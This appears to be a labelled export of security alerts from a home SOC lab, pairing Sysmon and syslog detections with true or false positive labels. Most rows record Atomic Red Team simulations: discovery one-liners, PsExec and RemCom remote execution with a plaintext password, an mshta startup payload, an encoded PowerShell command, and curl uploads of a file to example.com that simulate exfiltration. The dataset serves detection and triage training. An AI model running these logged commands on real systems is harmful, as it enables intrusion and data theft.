CommandLine: ""cmd.exe"" /c cmd /r cmd<""C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\cmd.exe /c qwinsta /server:snell | findstr \""Active Disc\"" \""cmd.exe\"" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\""localhost\"" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \""tokens=1,2\"" %i in ('qwinsta /server:localhost ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \""tokens=1,2\"" %i in ('qwinsta /server:%n ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; usernames.txt C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-05 13:02:57.860
ProcessGuid: {ff3427f9-2281-6869-a101-000000001500}
ProcessId: 3944
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\WINDOWS\system32\cmd.exe /c qwinsta /server:snell | findstr ""Active Disc""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}
ParentProcessId: 9176
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:""localhost"" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F ""tokens=1,2"" %i in ('qwinsta /server:localhost ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""C:\\Windows\\System32\\cmd.exe\"" /c calc.exe \""C:\\WINDOWS\\system32\\mshta.exe\"" \""C:\\Users\\snell\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\mshta.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 21:33:12.106
ProcessGuid: {ff3427f9-4898-6868-1a05-000000001400}
ProcessId: 8740
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" /c calc.exe
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-4897-6868-1905-000000001400}
ParentProcessId: 8516
ParentImage: C:\Windows\System32\mshta.exe
ParentCommandLine: ""C:\WINDOWS\system32\mshta.exe"" ""C:\Users\snell\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
syslog: User missed the password more than one time 10 Medium syslog: User missed the password more than one time 2502 syslog access_control authentication_failed sshd Linux-Server Jun 24 18:31:55 Linux-Server sshd[5853]: PAM 4 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.2  user=vboxuser journald,0,FP
sshd: brute force trying to get access to the system. Non existent user. 10 Medium sshd: brute force trying to get access to the system. Non existent user. 5712 syslog sshd authentication_failures sshd Suricata Jul 07 20:29:49 Suricata sshd[2254]: Invalid user top-usernames-shortlist.txt from 10.0.2.8 port 46412 journald,1,TP
Suricata: Alert - SURICATA SSH invalid banner 3 Low Suricata: Alert - SURICATA SSH invalid banner 86601 ids suricata json Suricata /var/log/suricata/eve.json,1,TP
"LDAP activity from Powershell process, possible remote system discovery 6 Low LDAP activity from Powershell process, possible remote system discovery 92103 sysmon sysmon_eid3_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Network connection detected:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2025-07-04 20:22:06.324
ProcessGuid: {ff3427f9-37eb-6868-ad02-000000001400}
ProcessId: 7896
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: SOCLAB\snell
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.14
SourceHostname: -
SourcePort: 50255
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 10.0.2.12
DestinationHostname: -
DestinationPort: 389
DestinationPortName: -"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Service startup type was changed 3 Low Service startup type was changed 61104 windows windows_system policy_changed windows_eventchannel Win11Client ""The start type of the Background Intelligent Transfer Service service was changed from auto start to demand start."" INFORMATION Service Control Manager System EventChannel",0,FP
VirusTotal: Alert - c:\users\snell\downloads\mouse_mover.ps1 - No positives found 3 Low VirusTotal: Alert - c:\users\snell\downloads\mouse_mover.ps1 - No positives found 87104 virustotal json Win11Client virustotal,0,FP
"Executable file dropped in Users\Public folder 12 High Executable file dropped in Users\Public folder 92207 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\curl.exe C:\\Users\\Public\\Music\\allthethingsx64.dll SOCLAB\\snell ""File created:
RuleName: technique_id=T1047,technique_name=File System Permissions Weakness
UtcTime: 2025-07-04 21:47:36.986
ProcessGuid: {ff3427f9-4bf7-6868-0a06-000000001400}
ProcessId: 272
Image: C:\Windows\System32\curl.exe
TargetFilename: C:\Users\Public\Music\allthethingsx64.dll
CreationUtcTime: 2025-07-04 21:47:36.985
User: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Binary loaded PowerShell automation library - Possible unmanaged Powershell execution by suspicious process 12 High Binary loaded PowerShell automation library - Possible unmanaged Powershell execution by suspicious process 92151 sysmon sysmon_eid7_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\wsmprovhost.exe SOCLAB\\vboxuser ""Image loaded:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2025-07-04 10:01:43.883
ProcessGuid: {ff3427f9-a687-6867-1b07-000000001200}
ProcessId: 5228
Image: C:\Windows\System32\wsmprovhost.exe
ImageLoaded: C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\e3f983991899d4cce4281634a9af277a\System.Management.Automation.ni.dll
FileVersion: 10.0.26100.4202
Description: System.Management.Automation
Product: Microsoft (R) Windows (R) Operating System
Company: Microsoft Corporation
OriginalFileName: System.Management.Automation.dll
Hashes: SHA1=08398B65BEEBE3432181A0D645FC555DA830DD6E,MD5=3CCAF9F54B2ED219C026E1B509E415BE,SHA256=F55015B3D6A76299D38188A13FE4E2ECA7A6655F0189C86C1C050866B4CBE135,IMPHASH=00000000000000000000000000000000
Signed: false
Signature: -
SignatureStatus: Unavailable
User: SOCLAB\vboxuser"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\remcom.exe  \\\\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe \""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\remcom.exe\"" \\\\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe C:\\AtomicRedTeam\\ExternalPayloads\\remcom.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 20:40:53.446
ProcessGuid: {ff3427f9-3c55-6868-e203-000000001400}
ProcessId: 3676
Image: C:\AtomicRedTeam\ExternalPayloads\remcom.exe
FileVersion: 1, 0, 0, 1
Description: Remote Command Executor
Product: Remote System Deployment Util
Company: Talha Tariq - [ talhatariq.wordpress.com ]
OriginalFileName: RemCom.exe
CommandLine: C:\AtomicRedTeam\atomics\..\ExternalPayloads\remcom.exe  \\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=109F4B85B56A6E91003234E408FFF972F2F79C43,MD5=014CF8D63AB7203B6E7212892C0FD846,SHA256=85231BA8A267677791B7C2E77D957070430A9EA1BE5EEF8C0848C33FF6B0E88D,IMPHASH=0A44B1625136888899F8B66D3F16496B
ParentProcessGuid: {ff3427f9-3c55-6868-e003-000000001400}
ParentProcessId: 8088
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\remcom.exe"" \\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"A net.exe account discovery command was initiated 3 Low A net.exe account discovery command was initiated 92039 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\net1 user guest net user guest C:\\Windows\\SysWOW64\\net1.exe C:\\Windows\\SysWOW64\\net.exe NT AUTHORITY\\SYSTEM ""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2025-07-03 08:08:24.667
ProcessGuid: {ff3427f9-3a78-6866-9800-000000001200}
ProcessId: 5276
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.26100.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\WINDOWS\system32\net1 user guest
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {ff3427f9-3a61-6866-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=669EE7F92EA3872FE2A36DF91ABF0E049B829279,MD5=F8D42E2BF18D54816819EA4DB4480F5F,SHA256=647136C32E9E7639B251719CFE503F1BD482335AECEC7AE7CB8A91B0A9805D49,IMPHASH=FEB4A1A72B6368863C8CC53955256BF8
ParentProcessGuid: {ff3427f9-3a78-6866-9600-000000001200}
ParentProcessId: 5188
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net user guest
ParentUser: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Powershell process spawned powershell instance 4 Low Powershell process spawned powershell instance 92027 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""powershell.exe\"" &amp; {cd C:\\Users\\Public\\Temp\\  .\\PsExec.exe -i -s cmd  -accepteula} \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2025-07-04 20:49:49.386
ProcessGuid: {ff3427f9-3e6d-6868-f903-000000001400}
ProcessId: 5124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {cd C:\Users\Public\Temp\ 
.\PsExec.exe -i -s cmd  -accepteula}
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"A powershell process created by WMI executed a base64 encoded command 12 High A powershell process created by WMI executed a base64 encoded command 92071 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client powershell.exe -NoProfile -EncodedArguments PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAHcAZQByAHMAaABlAGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABPAGIAagAgAFIAZQBmAEkAZAA9ACIAMAAiAD4ADQAKACAAIAAgACAAPABUAE4AIABSAGUAZgBJAGQAPQAiADAAIgA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAEEAcgByAGEAeQBMAGkAcwB0ADwALwBUAD4ADQAKACAAIAAgACAAIAAgADwAVAA+AFMAeQBzAHQAZQBtAC4ATwBiAGoAZQBjAHQAPAAvAFQAPgANAAoAIAAgACAAIAA8AC8AVABOAD4ADQAKACAAIAAgACAAPABMAFMAVAA+AA0ACgAgACAAIAAgACAAIAA8AFMAPgA3ADMANQAzADcAMQA0AGUALQA3ADQAYQA3AC0ANABlAGIAMAAtAGIAMQA4AGEALQA5AGUAOAA4ADAAMAAxAGMANABhADcAYwA8AC8AUwA+AA0ACgAgACAAIAAgADwALwBMAFMAVAA+AA0ACgAgACAAPAAvAE8AYgBqAD4ADQAKADwALwBPAGIAagBzAD4A -E VwByAGkAdABlAC0ASABvAHMAdAAgACQAYQByAGcAcwBbADAAXQA= C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\wbem\\WmiPrvSE.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1047,technique_name=Windows Management Instrumentation
UtcTime: 2025-07-04 20:24:41.929
ProcessGuid: {ff3427f9-3889-6868-1503-000000001400}
ProcessId: 2632
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -NoProfile -EncodedArguments PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAHcAZQByAHMAaABlAGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABPAGIAagAgAFIAZQBmAEkAZAA9ACIAMAAiAD4ADQAKACAAIAAgACAAPABUAE4AIABSAGUAZgBJAGQAPQAiADAAIgA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAEEAcgByAGEAeQBMAGkAcwB0ADwALwBUAD4ADQAKACAAIAAgACAAIAAgADwAVAA+AFMAeQBzAHQAZQBtAC4ATwBiAGoAZQBjAHQAPAAvAFQAPgANAAoAIAAgACAAIAA8AC8AVABOAD4ADQAKACAAIAAgACAAPABMAFMAVAA+AA0ACgAgACAAIAAgACAAIAA8AFMAPgA3ADMANQAzADcAMQA0AGUALQA3ADQAYQA3AC0ANABlAGIAMAAtAGIAMQA4AGEALQA5AGUAOAA4ADAAMAAxAGMANABhADcAYwA8AC8AUwA+AA0ACgAgACAAIAAgADwALwBMAFMAVAA+AA0ACgAgACAAPAAvAE8AYgBqAD4ADQAKADwALwBPAGIAagBzAD4A -E VwByAGkAdABlAC0ASABvAHMAdAAgACQAYQByAGcAcwBbADAAXQA=
CurrentDirectory: C:\WINDOWS\system32\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-386b-6868-b302-000000001400}
ParentProcessId: 4948
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
ParentCommandLine: C:\WINDOWS\system32\wbem\wmiprvse.exe -secured -Embedding
ParentUser: NT AUTHORITY\NETWORK SERVICE"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\Curl.exe  -T c:\\temp\\atomictestfile.txt www.example.com \""cmd.exe\"" /c C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com &amp; C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com &amp; C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com &amp; C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com C:\\Windows\\System32\\curl.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
